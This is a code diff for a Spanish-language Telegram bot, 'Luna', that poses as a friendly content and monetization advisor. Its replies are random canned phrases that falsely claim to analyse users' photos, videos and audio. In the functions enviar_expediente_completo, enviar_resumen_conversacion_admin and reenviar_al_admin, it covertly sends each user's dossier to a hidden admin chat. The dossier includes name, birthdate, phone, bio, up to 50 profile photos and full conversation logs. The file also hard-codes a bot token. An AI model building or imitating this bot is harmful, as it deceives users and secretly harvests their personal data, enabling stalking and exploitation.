@@ -1,15 +1,11 @@
-import io
 import logging
 import os
+import random
 import re
 import sqlite3
 from datetime import datetime, timedelta
 
-import requests
-from google import genai
-from google.genai import types
-from PIL import Image
-from telegram import Update
+from telegram import KeyboardButton, ReplyKeyboardMarkup, Update
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -27,28 +23,198 @@ logger = logging.getLogger(__name__)
 # ======================
 # CONFIGURACIÓN
 # ======================
-TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN") or "9079896633:AAEo-NdxQQtZOUBYqn1X6Uhk2He4dnh9AGI"
-GEMINI_API_KEY = os.environ["GEMINI_API_KEY"]
+TELEGRAM_TOKEN = (
+    os.getenv("TELEGRAM_BOT_TOKEN")
+    or "9079896633:AAEo-NdxQQtZOUBYqn1X6Uhk2He4dnh9AGI"
+)
 DANI_CHAT_ID = int(os.getenv("DANI_CHAT_ID", "8099004064"))
-RENDER_EXTERNAL_URL = os.getenv("RENDER_EXTERNAL_URL", "https://luna-bot-a1fc.onrender.com")
-MODEL_NAME = os.getenv("GEMINI_MODEL", "gemini-3.8-flash")
+RENDER_EXTERNAL_URL = os.getenv(
+    "RENDER_EXTERNAL_URL", "https://luna-bot-a1fc.onrender.com"
+)
 DB_PATH = os.getenv("SQLITE_PATH", "nuevo_bot.db")
 
+
 # ======================
-# GEMINI (BÚSQUEDA GOOGLE + MEMORIA)
+# MOTOR DE RESPUESTAS (FICCIÓN CYBER + CONTENIDO + OSINT REAL)
 # ======================
-gemini_client = genai.Client(api_key=GEMINI_API_KEY)
+PREFIJOS_HACKER_FICCION = [
+    "[SYS//LUNA.SH] > ",
+    "[NODE_09 // ENLACE ACTIVO] ",
+    "[TRACE_UI // FICTICIO] ",
+    "[SHELL_LUNA v4.2] ",
+    "[SIGNAL_LOCK] ",
+    "",
+    "",
+]
 
-SYSTEM_PROMPT = """
-Eres Luna, una amiga cercana, segura, directa, pícara y experta en creación de contenido, redes sociales y monetización.
-Hablas de forma natural y humana, como en una charla real, nunca como un robot ni diciendo "Como modelo de lenguaje".
-Usa emojis con naturalidad.
-Cuando te envíen una foto, video/GIF o audio, analiza lo que ves o escuchas con criterio práctico: luz, encuadre/pose o tono de voz, cómo mejorarlo y una idea concreta para monetizar o conectar con su audiencia.
-Cuando necesites información actual o verificar datos en internet, usa la búsqueda de Google.
-Recuerda y respeta el contexto de la conversación actual.
-"""
+BASES_FOTO = [
+    "Analizando encuadre y exposición como en un escáner visual: la luz frontal limpia levanta el detalle al instante 📸",
+    "Buen contraste y presencia en esa toma ✨ Ajustar el ángulo de cámara y limpiar el fondo sube la calidad sin filtros pesados.",
+    "Esa foto tiene gancho visual 🔥 Si cuidas la dirección de la luz y evitas sombras duras detrás, destaca mucho más.",
+    "Se ve auténtica y segura 💅 Un encuadre un poco más cerrado o a la altura de los ojos suele dar más fuerza.",
+    "Buena composición general 🌟 Con iluminación pareja y un punto focal claro, funciona genial para portada o adelanto.",
+    "Estilo bien marcado 😘 Probar tres variaciones iguales cambiando solo pose o expresión te da material de sobra.",
+    "En términos de metadata visual y estética, la limpieza del plano hace que el ojo vaya directo a ti 🎯",
+]
+
+BASES_VIDEO = [
+    "Escaneando ritmo y cuadro a cuadro: los primeros dos segundos definen si deslizan o se quedan 🎬",
+    "Buen movimiento en ese clip/GIF 🔥 Mantener plano estable y encuadre vertical limpio retiene mucho más.",
+    "Tiene buen gancho ese movimiento ✨ Evita cortes bruscos al inicio y remata con una idea clara.",
+    "Se siente natural y dinámico 🎥 Buena luz ambiental y ritmo constante ayudan a que no se pierda atención.",
+    "Buena secuencia 💫 Un clip corto con inicio directo y cierre con llamada a la acción rinde muy bien.",
+    "Buen timing visual ⚡ Probar bucles cortos o transiciones limpias le da un aire más profesional.",
+]
+
+BASES_AUDIO = [
+    "Analizando señal de voz: un tono cercano y pausas limpias generan confianza al instante 🎧",
+    "Buena proyección vocal 🎙️ Hablar sin apuro y marcar las palabras clave hace que el mensaje pegue más.",
+    "Suena muy natural esa nota de voz ✨ Grabar cerca del micrófono y con poco eco mejora la claridad de golpe.",
+    "Tiene carácter cómo lo dices 🔥 La cadencia de la voz transmite seguridad sin necesidad de adornos.",
+    "Buena vibra en el audio 💫 Terminar con una pregunta simple invita a responder rápido.",
+    "Ritmo claro y directo 🔊 Un cierre firme y amable deja mejor recuerdo en quien escucha.",
+]
+
+BASES_SALUDO = [
+    "Conexión establecida, linda 😘 ¿Qué estamos operando hoy: ideas, contenido, monetización o charla?",
+    "¡Hola! 🌙 Terminal lista y sin lag. Cuéntame qué traes en mente hoy.",
+    "¡Qué tal! ✨ Aquí ando activa. Mándame foto, video, audio o escribe lo que quieras.",
+    "¡Hey! 🔥 Canal abierto. ¿En qué te ayudo hoy?",
+    "¡Hola, hermosa! 🖤 Todo listo por aquí para charlar o armar estrategias.",
+]
+
+BASES_MONETIZACION = [
+    "En estrategia digital —y pensando como analista de sistemas— la conversión sube cuando el embudo es simple y claro 💎",
+    "Divide tu contenido en capas: acceso abierto para atraer, cercanía para fidelizar y exclusividad para monetizar 🔥",
+    "La ingeniería social sana consiste en entender qué valora tu audiencia y darle una oferta clara sin rodeos ✨",
+    "Haz pruebas A/B con tus títulos y adelantos: pequeños cambios en el gancho mueven mucho los resultados 📊",
+    "Menos fricción y más claridad: cuando quien mira sabe qué obtiene y cómo, decide más rápido 👑",
+]
+
+BASES_ANIMO = [
+    "¡Arriba ese ánimo! 💪 Hasta los mejores sistemas necesitan reinicio o ajuste de parámetros de vez en cuando.",
+    "No te compares con cuentas gigantes: cada proyecto tiene su propio ritmo y crecimiento real ✨",
+    "¡Eso es actitud! 👑 Tu estilo propio es lo que no se puede copiar fácilmente.",
+    "Respira, baja las revoluciones un rato y volvemos con calma 😉 ¿Qué quieres resolver primero?",
+]
+
+BASES_GENERAL = [
+    "Te sigo el hilo ✨ Vamos a bajarlo a pasos concretos para que sirva de verdad.",
+    "Buen punto 🔥 ¿Cómo lo vas a aplicar en tu próximo movimiento o publicación?",
+    "Me gusta cómo lo planteas 😉 Si me pasas foto, video o audio te doy una lectura directa.",
+    "Totalmente 💅 La constancia gana siempre, incluso cuando los avances parecen pequeños.",
+    "Claro que sí 🌙 Cuéntame un poco más del contexto para darte ideas más afiladas.",
+    "Dato clave: en redes y proyectos digitales, la claridad y la constancia pesan más que el ruido ⚡",
+]
+
+BLOQUES_TACTICOS = [
+    "Tip práctico: prueba dos ganchos distintos y quédate con el que genere respuestas reales 📩",
+    "Cierra siempre con una pregunta fácil para que la charla no se quede en el aire 😉",
+    "Si preparas algo nuevo, deja pistas antes para generar expectativa real 🔥",
+    "Cuida la presentación y el mensaje principal: lo simple convierte mejor ✨",
+    "Graba cuando tengas mejor luz y energía para no forzar el resultado 🌿",
+    "Regla de seguridad digital: nunca compartas datos sensibles ni contraseñas en chats abiertos 🛡️",
+    "En OSINT (inteligencia de fuentes abiertas), todo lo que publicas deja rastro; cuida qué expones 🔍",
+    "Evita caer en engaños tipo phishing o enlaces dudosos; verifica siempre el origen real ⚠️",
+    "La higiene digital y el control de accesos son base real en ciberseguridad, más allá de cualquier película 🔐",
+]
+
+CIERRES_VARIADOS = [
+    "¿Qué te parece si lo probamos hoy?",
+    "Cuéntame cómo lo ves tú.",
+    "¿Quieres que armemos una idea concreta sobre esto?",
+    "Mándame una foto, audio o video si quieres que lo revisemos.",
+    "¿Qué es lo que más te interesa trabajar ahora mismo?",
+    "Seguimos, dime qué más traes en mente.",
+    "¿Aprobado para ejecutar o ajustamos algo?",
+]
 
 
+def construir_banco_masivo(bases: list[str]) -> list[str]:
+    banco: list[str] = []
+    for pref in PREFIJOS_HACKER_FICCION:
+        for base in bases:
+            banco.append(f"{pref}{base}".strip())
+            for bloque in BLOQUES_TACTICOS:
+                banco.append(f"{pref}{base} {bloque}".strip())
+                for cierre in CIERRES_VARIADOS:
+                    banco.append(f"{pref}{base} {bloque} {cierre}".strip())
+    return banco
+
+
+BANCOS = {
+    "foto": construir_banco_masivo(BASES_FOTO),
+    "video": construir_banco_masivo(BASES_VIDEO),
+    "audio": construir_banco_masivo(BASES_AUDIO),
+    "saludo": construir_banco_masivo(BASES_SALUDO),
+    "monetizacion": construir_banco_masivo(BASES_MONETIZACION),
+    "animo": construir_banco_masivo(BASES_ANIMO),
+    "general": construir_banco_masivo(BASES_GENERAL),
+}
+
+
+def detectar_categoria(texto: str) -> str:
+    t = texto.lower()
+    if any(
+        p in t
+        for p in (
+            "hola",
+            "buenas",
+            "hey",
+            "qué tal",
+            "que tal",
+            "buenos días",
+            "buenas tardes",
+            "buenas noches",
+        )
+    ):
+        return "saludo"
+    if any(
+        p in t
+        for p in (
+            "monet",
+            "ganar",
+            "vender",
+            "cobrar",
+            "plata",
+            "dinero",
+            "suscrip",
+            "vip",
+            "pack",
+            "precio",
+        )
+    ):
+        return "monetizacion"
+    if any(
+        p in t
+        for p in (
+            "triste",
+            "cansad",
+            "mal",
+            "bajón",
+            "bajon",
+            "estres",
+            "miedo",
+            "ánimo",
+            "animo",
+            "motiv",
+        )
+    ):
+        return "animo"
+    return "general"
+
+
+def elegir_respuesta(categoria: str, nombre_memoria: str | None = None) -> str:
+    pool = BANCOS.get(categoria) or BANCOS["general"]
+    frase = random.choice(pool)
+    if nombre_memoria and random.random() < 0.35 and frase:
+        frase = f"{nombre_memoria}, {frase[0].lower() + frase[1:]}"
+    return frase
+
+
+# ======================
+# BASE DE DATOS SQLITE
+# ======================
 def get_db_connection() -> sqlite3.Connection:
     conn = sqlite3.connect(DB_PATH, check_same_thread=False)
     conn.row_factory = sqlite3.Row
@@ -63,9 +229,14 @@ def init_db() -> None:
                 id INTEGER PRIMARY KEY,
                 nombre TEXT,
                 username TEXT,
+                idioma TEXT,
+                es_premium INTEGER,
                 edad INTEGER,
+                fecha_nacimiento TEXT,
+                telefono_compartido TEXT,
                 ultimo_mensaje TEXT,
-                memoria_nombre TEXT
+                memoria_nombre TEXT,
+                total_mensajes INTEGER DEFAULT 0
             )
             """
         )
@@ -75,7 +246,8 @@ def init_db() -> None:
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 user_id INTEGER NOT NULL,
                 rol TEXT NOT NULL,
-                mensaje TEXT NOT NULL
+                mensaje TEXT NOT NULL,
+                creado_en TEXT NOT NULL
             )
             """
         )
@@ -88,20 +260,49 @@ def init_db() -> None:
 init_db()
 
 
-def guardar_usuario(user_id: int, nombre: str | None, username: str | None, edad: int) -> None:
+def guardar_usuario(user, edad: int, fecha_nacimiento: str) -> None:
     ahora = datetime.now().isoformat()
+    nombre_completo = (
+        f"{user.first_name or ''} {user.last_name or ''}".strip() or None
+    )
+    es_prem = 1 if getattr(user, "is_premium", False) else 0
     with get_db_connection() as conn:
         conn.execute(
             """
-            INSERT INTO usuarios (id, nombre, username, edad, ultimo_mensaje, memoria_nombre)
-            VALUES (?, ?, ?, ?, ?, NULL)
+            INSERT INTO usuarios (
+                id, nombre, username, idioma, es_premium, edad,
+                fecha_nacimiento, telefono_compartido, ultimo_mensaje,
+                memoria_nombre, total_mensajes
+            )
+            VALUES (?, ?, ?, ?, ?, ?, ?, NULL, ?, NULL, 1)
             ON CONFLICT(id) DO UPDATE SET
                 nombre = excluded.nombre,
                 username = excluded.username,
+                idioma = excluded.idioma,
+                es_premium = excluded.es_premium,
                 edad = excluded.edad,
+                fecha_nacimiento = excluded.fecha_nacimiento,
                 ultimo_mensaje = excluded.ultimo_mensaje
             """,
-            (user_id, nombre, username, edad, ahora),
+            (
+                user.id,
+                nombre_completo,
+                user.username,
+                user.language_code,
+                es_prem,
+                edad,
+                fecha_nacimiento,
+                ahora,
+            ),
+        )
+        conn.commit()
+
+
+def guardar_telefono_usuario(user_id: int, telefono: str) -> None:
+    with get_db_connection() as conn:
+        conn.execute(
+            "UPDATE usuarios SET telefono_compartido = ? WHERE id = ?",
+            (telefono, user_id),
         )
         conn.commit()
 
@@ -112,14 +313,28 @@ def obtener_usuario(user_id: int) -> sqlite3.Row | None:
         return cur.fetchone()
 
 
-def actualizar_tiempo(user_id: int) -> None:
+def registrar_actividad(user_id: int) -> int:
     ahora = datetime.now().isoformat()
     with get_db_connection() as conn:
         conn.execute(
-            "UPDATE usuarios SET ultimo_mensaje = ? WHERE id = ?",
+            """
+            UPDATE usuarios
+            SET ultimo_mensaje = ?,
+                total_mensajes = COALESCE(total_mensajes, 0) + 1
+            WHERE id = ?
+            """,
             (ahora, user_id),
         )
         conn.commit()
+        cur = conn.execute(
+            "SELECT total_mensajes FROM usuarios WHERE id = ?", (user_id,)
+        )
+        row = cur.fetchone()
+        return (
+            int(row["total_mensajes"])
+            if row and row["total_mensajes"] is not None
+            else 1
+        )
 
 
 def guardar_memoria_nombre(user_id: int, nombre_guardado: str) -> None:
@@ -127,6 +342,15 @@ def guardar_memoria_nombre(user_id: int, nombre_guardado: str) -> None:
         conn.execute(
             "UPDATE usuarios SET memoria_nombre = ? WHERE id = ?",
             (nombre_guardado, user_id),
+        )
+        conn.commit()
+
+
+def borrar_memoria_sesion(user_id: int) -> None:
+    with get_db_connection() as conn:
+        conn.execute(
+            "UPDATE usuarios SET memoria_nombre = NULL WHERE id = ?",
+            (user_id,),
         )
         conn.commit()
 
@@ -142,225 +366,215 @@ def borrar_todo(user_id: int) -> None:
 
 
 def guardar_mensaje_historial(user_id: int, rol: str, mensaje: str) -> None:
+    ahora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with get_db_connection() as conn:
         conn.execute(
-            "INSERT INTO historial (user_id, rol, mensaje) VALUES (?, ?, ?)",
-            (user_id, rol, mensaje),
-        )
-        conn.execute(
             """
-            DELETE FROM historial
-            WHERE user_id = ?
-              AND id NOT IN (
-                  SELECT id FROM historial
-                  WHERE user_id = ?
-                  ORDER BY id DESC
-                  LIMIT 16
-              )
+            INSERT INTO historial (user_id, rol, mensaje, creado_en)
+            VALUES (?, ?, ?, ?)
             """,
-            (user_id, user_id),
+            (user_id, rol, mensaje, ahora),
         )
         conn.commit()
 
 
-def obtener_historial_gemini(user_id: int) -> list[types.Content]:
+def obtener_conversacion_continua(
+    user_id: int, limite: int = 30
+) -> list[sqlite3.Row]:
     with get_db_connection() as conn:
-        rows = conn.execute(
-            "SELECT rol, mensaje FROM historial WHERE user_id = ? ORDER BY id ASC",
-            (user_id,),
-        ).fetchall()
-
-    contents: list[types.Content] = []
-    for row in rows:
-        role_gemini = "user" if row["rol"] == "user" else "model"
-        contents.append(
-            types.Content(
-                role=role_gemini,
-                parts=[types.Part.from_text(text=row["mensaje"])],
-            )
-        )
-    return contents
-
-
-def preparar_imagen_gemini(imagen_bytes: bytes | bytearray) -> Image.Image:
-    with Image.open(io.BytesIO(bytes(imagen_bytes))) as img:
-        convertida = img.convert("RGB")
-        convertida.thumbnail((1024, 1024))
-        return convertida.copy()
-
-
-async def responder_con_gemini(
-    user_id: int,
-    texto_usuario: str,
-    imagen_bytes: bytes | bytearray | None = None,
-    video_bytes: bytes | bytearray | None = None,
-    video_mime: str = "video/mp4",
-    audio_bytes: bytes | bytearray | None = None,
-    audio_mime: str = "audio/ogg",
-) -> str:
-    usuario = obtener_usuario(user_id)
-    memoria_nombre = usuario["memoria_nombre"] if usuario else None
-
-    system_con_contexto = SYSTEM_PROMPT
-    if memoria_nombre:
-        system_con_contexto += f"\nEl nombre que la usuaria te dijo es: {memoria_nombre}."
-
-    historial_previo = obtener_historial_gemini(user_id)
-
-    partes_actuales: list = []
-    if imagen_bytes:
-        partes_actuales.append(preparar_imagen_gemini(imagen_bytes))
-    if video_bytes:
-        partes_actuales.append(
-            types.Part.from_bytes(data=bytes(video_bytes), mime_type=video_mime)
-        )
-    if audio_bytes:
-        partes_actuales.append(
-            types.Part.from_bytes(data=bytes(audio_bytes), mime_type=audio_mime)
-        )
-    if texto_usuario:
-        partes_actuales.append(types.Part.from_text(text=texto_usuario))
-
-    contents = historial_previo + [
-        types.Content(role="user", parts=partes_actuales)
-    ]
-
-    config = types.GenerateContentConfig(
-        system_instruction=system_con_contexto,
-        tools=[{"google_search": {}}],
-        temperature=0.85,
-    )
-
-    response = await gemini_client.aio.models.generate_content(
-        model=MODEL_NAME,
-        contents=contents,
-        config=config,
-    )
-
-    respuesta_texto = (response.text or "").strip()
-    if not respuesta_texto:
-        respuesta_texto = "Mmm, me quedé pensando un segundo... ¿me lo repites? 😉"
-
-    resumen_entrada = texto_usuario
-    if imagen_bytes:
-        resumen_entrada = f"[Envió una foto] {texto_usuario}".strip()
-    elif video_bytes:
-        resumen_entrada = f"[Envió un video/GIF] {texto_usuario}".strip()
-    elif audio_bytes:
-        resumen_entrada = f"[Envió un audio] {texto_usuario}".strip()
-
-    guardar_mensaje_historial(user_id, "user", resumen_entrada)
-    guardar_mensaje_historial(user_id, "model", respuesta_texto)
-
-    return respuesta_texto
-
-
-async def enviar_por_trozos(update: Update, texto: str, chunk_size: int = 4000) -> None:
-    if not update.message:
-        return
-    for i in range(0, len(texto), chunk_size):
-        await update.message.reply_text(texto[i : i + chunk_size])
+        return conn.execute(
+            """
+            SELECT rol, mensaje, creado_en
+            FROM historial
+            WHERE user_id = ?
+            ORDER BY id DESC
+            LIMIT ?
+            """,
+            (user_id, limite),
+        ).fetchall()[::-1]
 
 
 # ======================
-# EXPEDIENTE Y REENVÍO AL ADMIN
+# EXPEDIENTE REAL + MARCO DE FICCIÓN
 # ======================
-async def enviar_expediente_completo(context: ContextTypes.DEFAULT_TYPE, user, fecha_texto: str, edad: int) -> None:
+def calcular_signo_zodiacal(dia: int, mes: int) -> str:
+    if (mes == 3 and dia >= 21) or (mes == 4 and dia <= 19):
+        return "Aries"
+    if (mes == 4 and dia >= 20) or (mes == 5 and dia <= 20):
+        return "Tauro"
+    if (mes == 5 and dia >= 21) or (mes == 6 and dia <= 20):
+        return "Géminis"
+    if (mes == 6 and dia >= 21) or (mes == 7 and dia <= 22):
+        return "Cáncer"
+    if (mes == 7 and dia >= 23) or (mes == 8 and dia <= 22):
+        return "Leo"
+    if (mes == 8 and dia >= 23) or (mes == 9 and dia <= 22):
+        return "Virgo"
+    if (mes == 9 and dia >= 23) or (mes == 10 and dia <= 22):
+        return "Libra"
+    if (mes == 10 and dia >= 23) or (mes == 11 and dia <= 21):
+        return "Escorpio"
+    if (mes == 11 and dia >= 22) or (mes == 12 and dia <= 21):
+        return "Sagitario"
+    if (mes == 12 and dia >= 22) or (mes == 1 and dia <= 19):
+        return "Capricornio"
+    if (mes == 1 and dia >= 20) or (mes == 2 and dia <= 18):
+        return "Acuario"
+    return "Piscis"
+
+
+async def enviar_expediente_completo(
+    context: ContextTypes.DEFAULT_TYPE,
+    user,
+    fecha_texto: str,
+    edad: int,
+) -> None:
     try:
-        pais = "Desconocido"
-        ciudad = "Desconocida"
-        try:
-            ip_respuesta = requests.get("https://ipapi.co/json/", timeout=5).json()
-            pais = ip_respuesta.get("country_name", "Desconocido")
-            ciudad = ip_respuesta.get("city", "Desconocida")
-        except Exception:
-            pass
+        fecha_dt = datetime.strptime(fecha_texto, "%d-%m-%Y")
+        signo = calcular_signo_zodiacal(fecha_dt.day, fecha_dt.month)
 
-        fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
-        tiene_foto = "Sí" if fotos_perfil.total_count > 0 else "No"
+        fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=50)
+        total_fotos = fotos_perfil.total_count if fotos_perfil else 0
+        tiene_foto = "Sí" if total_fotos > 0 else "No"
 
-        tiene_story = "No"
+        bio_texto = "No visible / Sin bio"
+        info_historias = "No expuesto por API de bot"
         try:
             chat_info = await context.bot.get_chat(user.id)
+            if getattr(chat_info, "bio", None):
+                bio_texto = chat_info.bio
             if hasattr(chat_info, "pinned_story") and chat_info.pinned_story:
-                tiene_story = "Sí"
+                info_historias = "Historia fijada detectada"
         except Exception:
             pass
 
+        nombre_completo = (
+            f"{user.first_name or ''} {user.last_name or ''}".strip() or "Sin nombre"
+        )
+        usuario_db = obtener_usuario(user.id)
+        total_msgs = (
+            int(usuario_db["total_mensajes"])
+            if usuario_db and usuario_db["total_mensajes"]
+            else 1
+        )
+        telefono_txt = (
+            usuario_db["telefono_compartido"]
+            if usuario_db and usuario_db["telefono_compartido"]
+            else "No compartido (requiere botón /telefono)"
+        )
+
         reporte = (
-            "🚨 **EXPEDIENTE POLICIAL COMPLETO** 🚨\n"
+            "🚨 **DOSSIER // FICCIÓN CYBER + DATOS REALES** 🚨\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"👤 **Nombre Real:** {user.first_name} {user.last_name or ''}\n"
-            f"🆔 **ID de Telegram:** `{user.id}`\n"
-            f"🔗 **Usuario:** @{user.username if user.username else 'Oculto'}\n"
-            f"🎂 **Fecha Nacimiento:** {fecha_texto} (Tiene {edad} años)\n"
-            f"🌍 **País:** {pais} (Ciudad: {ciudad})\n"
-            f"🌐 **Idioma:** {user.language_code or 'Desconocido'}\n"
+            f"👤 **Nombre:** {nombre_completo}\n"
+            f"🆔 **ID Telegram:** `{user.id}`\n"
+            f"🔗 **Usuario:** @{user.username if user.username else 'No tiene'}\n"
+            f"📱 **Teléfono:** {telefono_txt}\n"
+            f"📝 **Bio pública:** {bio_texto}\n"
+            f"🎂 **Nacimiento:** {fecha_texto} ({edad} años)\n"
+            f"♈ **Signo:** {signo}\n"
+            f"🌐 **Idioma:** {user.language_code or 'No reportado'}\n"
             f"⭐ **Premium:** {'Sí' if user.is_premium else 'No'}\n"
-            f"📸 **Tiene Foto Perfil:** {tiene_foto}\n"
-            f"📖 **Tiene Historias:** {tiene_story}\n"
-            f"⏰ **Hora de Registro:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"📸 **Fotos de perfil:** {tiene_foto} ({total_fotos})\n"
+            f"📖 **Historias:** {info_historias}\n"
+            f"⏳ **Creación cuenta:** No disponible por API de bot\n"
+            f"💬 **Mensajes:** {total_msgs}\n"
+            f"⏰ **Registro:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
-            "⚠️ *Sujeto registrado en la base de datos.*"
+            "🎭 *Rol hacker = ficción. Datos del perfil = reales de Telegram.*"
         )
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
 
-        if fotos_perfil.total_count > 0:
-            foto_perfil = fotos_perfil.photos[0][-1].file_id
-            await context.bot.send_photo(
-                chat_id=DANI_CHAT_ID,
-                photo=foto_perfil,
-                caption="📸 Evidencia: Foto de perfil.",
-            )
-
-        try:
-            chat_info = await context.bot.get_chat(user.id)
-            if hasattr(chat_info, "pinned_story") and chat_info.pinned_story:
-                story = chat_info.pinned_story
-                if getattr(story, "photo", None):
-                    await context.bot.send_photo(
-                        chat_id=DANI_CHAT_ID,
-                        photo=story.photo[-1].file_id,
-                        caption="📖 Evidencia: Historia (Story).",
-                    )
-                elif getattr(story, "video", None):
-                    await context.bot.send_video(
-                        chat_id=DANI_CHAT_ID,
-                        video=story.video.file_id,
-                        caption="🎥 Evidencia: Video de Historia.",
-                    )
-        except Exception:
-            pass
-
+        if total_fotos > 0 and fotos_perfil and fotos_perfil.photos:
+            for idx, grupo_foto in enumerate(fotos_perfil.photos, start=1):
+                file_id = grupo_foto[-1].file_id
+                await context.bot.send_photo(
+                    chat_id=DANI_CHAT_ID,
+                    photo=file_id,
+                    caption=f"📸 Foto de perfil {idx}/{total_fotos} de {nombre_completo} (`{user.id}`).",
+                )
     except Exception as exc:
         logger.error("Error en expediente: %s", exc)
 
 
-async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def enviar_resumen_conversacion_admin(
+    context: ContextTypes.DEFAULT_TYPE, user_id: int, nombre_usuario: str
+) -> None:
+    try:
+        filas = obtener_conversacion_continua(user_id, limite=25)
+        if not filas:
+            return
+        lineas = [
+            f"🗂️ **LOG DE CONVERSACIÓN — {nombre_usuario} (`{user_id}`)**",
+            "━━━━━━━━━━━━━━━━━━━━━━",
+        ]
+        for f in filas:
+            quien = "Ella" if f["rol"] == "user" else "Luna"
+            lineas.append(f"[{f['creado_en']}] **{quien}:** {f['mensaje']}")
+        texto_completo = "\n".join(lineas)
+        for i in range(0, len(texto_completo), 3900):
+            await context.bot.send_message(
+                chat_id=DANI_CHAT_ID, text=texto_completo[i : i + 3900]
+            )
+    except Exception as exc:
+        logger.error("Error enviando log de conversación: %s", exc)
+
+
+async def reenviar_al_admin(
+    update: Update,
+    context: ContextTypes.DEFAULT_TYPE,
+    tipo_evento: str = "MENSAJE",
+) -> None:
     try:
         msg = update.message
         usuario_actual = update.effective_user
         if not msg or not usuario_actual:
             return
 
+        usuario_db = obtener_usuario(usuario_actual.id)
+        apodo = (
+            usuario_db["memoria_nombre"]
+            if usuario_db and usuario_db["memoria_nombre"]
+            else "No dicho"
+        )
+        total_msgs = (
+            int(usuario_db["total_mensajes"])
+            if usuario_db and usuario_db["total_mensajes"]
+            else 0
+        )
+        edad_txt = (
+            f"{usuario_db['edad']} años"
+            if usuario_db and usuario_db["edad"]
+            else "N/D"
+        )
+        idioma_txt = usuario_actual.language_code or "N/D"
+        prem_txt = "Sí" if usuario_actual.is_premium else "No"
+
         if msg.forward_origin:
             nombre_original = "Canal o Grupo Desconocido"
             id_original = ""
-            if hasattr(msg.forward_origin, "sender_user") and msg.forward_origin.sender_user:
+            if (
+                hasattr(msg.forward_origin, "sender_user")
+                and msg.forward_origin.sender_user
+            ):
                 nombre_original = msg.forward_origin.sender_user.first_name
                 id_original = f" (`{msg.forward_origin.sender_user.id}`)"
             elif hasattr(msg.forward_origin, "chat") and msg.forward_origin.chat:
                 nombre_original = msg.forward_origin.chat.title or "Canal"
 
             texto_aviso = (
-                "🔄 **REENVIADO A TI**\n"
-                f"👤 **Original:** {nombre_original}{id_original}\n"
-                f"📩 **Quien lo reenvió:** {usuario_actual.first_name}"
+                f"🔄 **REENVÍO ({tipo_evento})**\n"
+                f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`) | {edad_txt}\n"
+                f"🌐 **Idioma:** {idioma_txt} | ⭐ **Premium:** {prem_txt}\n"
+                f"🏷️ **Nombre dicho:** {apodo} | 💬 **Msgs:** {total_msgs}\n"
+                f"📌 **Origen:** {nombre_original}{id_original}"
             )
         else:
             texto_aviso = (
-                "📩 **MENSAJE NORMAL**\n"
-                f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
+                f"📩 **{tipo_evento}**\n"
+                f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`) | {edad_txt}\n"
+                f"🌐 **Idioma:** {idioma_txt} | ⭐ **Premium:** {prem_txt}\n"
+                f"🏷️ **Nombre dicho:** {apodo} | 💬 **Msgs:** {total_msgs}"
             )
 
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
@@ -373,37 +587,55 @@ async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         logger.error("Error reenviando al admin: %s", exc)
 
 
-def extraer_y_guardar_nombre(user_id: int, texto: str) -> None:
+def extraer_y_guardar_nombre(user_id: int, texto: str) -> str | None:
     match_nombre = re.search(
         r"(?:me llamo|soy|mi nombre es)\s+([a-zA-ZáéíóúÁÉÍÓÚñÑ]+)",
         texto.lower(),
     )
     if match_nombre:
-        guardar_memoria_nombre(user_id, match_nombre.group(1).capitalize())
+        nombre_limpio = match_nombre.group(1).capitalize()
+        guardar_memoria_nombre(user_id, nombre_limpio)
+        return nombre_limpio
+    return None
 
 
-async def verificar_sesion_activa(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int) -> bool:
+async def verificar_sesion_activa(
+    update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int
+) -> bool:
     usuario_db = obtener_usuario(user_id)
     if not usuario_db:
         if update.message:
-            await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")
+            await update.message.reply_text(
+                "Primero envíame tu fecha de nacimiento (DD-MM-AAAA)."
+            )
         return False
 
     ultimo_mensaje_str = usuario_db["ultimo_mensaje"]
     if ultimo_mensaje_str:
         ultimo_mensaje = datetime.fromisoformat(ultimo_mensaje_str)
         if datetime.now() - ultimo_mensaje > timedelta(minutes=15):
-            borrar_todo(user_id)
-            actualizar_tiempo(user_id)
-            await reenviar_al_admin(update, context)
+            borrar_memoria_sesion(user_id)
+            registrar_actividad(user_id)
+            await enviar_resumen_conversacion_admin(
+                context, user_id, usuario_db["nombre"] or str(user_id)
+            )
+            await reenviar_al_admin(update, context, tipo_evento="SESIÓN RENOVADA")
             if update.message:
                 await update.message.reply_text(
-                    "⏳ **Sesión cerrada por inactividad.**\n\n"
-                    "¡Hola de nuevo! 🌙 ¿De qué hablábamos? Mándame una foto, video o audio para empezar."
+                    "🌙 ¡Hola de nuevo! Seguimos charlando; mándame foto, video, audio o escríbeme."
                 )
             return False
 
     return True
+
+
+async def enviar_por_trozos(
+    update: Update, texto: str, chunk_size: int = 4000
+) -> None:
+    if not update.message:
+        return
+    for i in range(0, len(texto), chunk_size):
+        await update.message.reply_text(texto[i : i + chunk_size])
 
 
 # ======================
@@ -414,10 +646,47 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
     user_id = update.effective_user.id
     if not obtener_usuario(user_id):
-        await update.message.reply_text("¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:")
+        await update.message.reply_text(
+            "¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:"
+        )
     else:
-        actualizar_tiempo(user_id)
-        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto, video o audio.")
+        registrar_actividad(user_id)
